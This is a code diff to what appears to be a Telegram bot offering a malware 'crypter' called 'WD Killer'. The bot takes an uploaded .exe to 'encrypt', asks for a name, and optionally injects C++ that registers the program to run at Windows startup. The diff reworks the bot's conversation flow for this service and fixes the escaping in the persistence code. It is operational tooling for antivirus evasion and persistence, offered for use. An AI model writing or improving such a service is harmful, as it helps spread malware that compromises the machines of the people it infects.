@@ -258,15 +258,6 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             await query.edit_message_text(text, reply_markup=reply)
 
-    elif data == "wd_killer":
-        text = "✅ WD Killer selected.\n\nPlease upload your .exe file to encrypt it."
-        keyboard = [[InlineKeyboardButton("Back", callback_data="crypter")]]
-        reply = InlineKeyboardMarkup(keyboard)
-        if query.message.photo:
-            await query.edit_message_caption(caption=text, reply_markup=reply)
-        else:
-            await query.edit_message_text(text, reply_markup=reply)
-
     elif data == "back":
         keyboard = [
             [InlineKeyboardButton("Profile", callback_data="profile")],
@@ -322,7 +313,21 @@ async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # Conversation states
-GET_FILENAME, GET_STARTUP_CHOICE = range(2)
+AWAITING_FILE, GET_FILENAME, GET_STARTUP_CHOICE = range(3)
+
+async def start_crypter_flow(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Starts the crypter conversation, asks for file."""
+    query = update.callback_query
+    await query.answer()
+    text = "✅ WD Killer selected.\n\nPlease upload your .exe file to encrypt it.\n\nSend /cancel to go back."
+
+    # No keyboard, to make it clear the user should send a file or cancel.
+    if query.message.photo:
+        await query.edit_message_caption(caption=text)
+    else:
+        await query.edit_message_text(text)
+
+    return AWAITING_FILE
 
 async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the initial file upload and starts the conversation."""
@@ -421,7 +426,7 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         if startup:
             # Note: The C++ string literal for the registry key requires double backslashes
             # The app name needs to be in escaped quotes
-            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
+            startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup("{app_name_for_registry}", currentPath);'
 
         cpp_template = f'''
 #include <windows.h>
@@ -511,16 +516,17 @@ def main():
     reset_time = time(hour=0, minute=0, second=0, tzinfo=tzinfo)
     job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")
 
-    conv_handler = ConversationHandler(
-        entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
+    crypter_conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(start_crypter_flow, pattern='^wd_killer$')],
         states={
+            AWAITING_FILE: [MessageHandler(filters.Document.ALL, file_upload_handler)],
             GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
-            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice)],
+            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice, pattern='^startup_(yes|no)$')],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
     )
 
-    app.add_handler(conv_handler)
+    app.add_handler(crypter_conv_handler)
     app.add_handler(CommandHandler("start", start))
     # Note: The main callback_handler for the menu buttons is still needed for profile, plans, etc.
     app.add_handler(CallbackQueryHandler(callback_handler))
